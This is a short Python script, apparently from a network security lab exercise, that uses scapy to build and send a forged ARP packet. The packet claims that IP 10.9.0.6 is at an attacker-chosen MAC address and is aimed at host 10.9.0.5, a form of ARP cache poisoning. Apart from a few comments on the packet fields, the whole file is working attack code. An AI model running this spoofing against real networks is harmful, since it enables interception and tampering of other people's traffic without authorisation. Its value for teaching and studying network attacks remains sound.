#!/usr/bin/python3
from scapy.all import *
 
E = Ether()
 
A = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6',hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')
#hwdst is the hardware destination
#hwsrc is the hardware source
#These are the MAC addresses which can change over the course of the packet transfer
 
pkt = E/A   #Creates a packet with the Ethernet frame as the 
            #outer layer and the ARP packet as the inner payload.

pkt.show()
sendp(pkt)
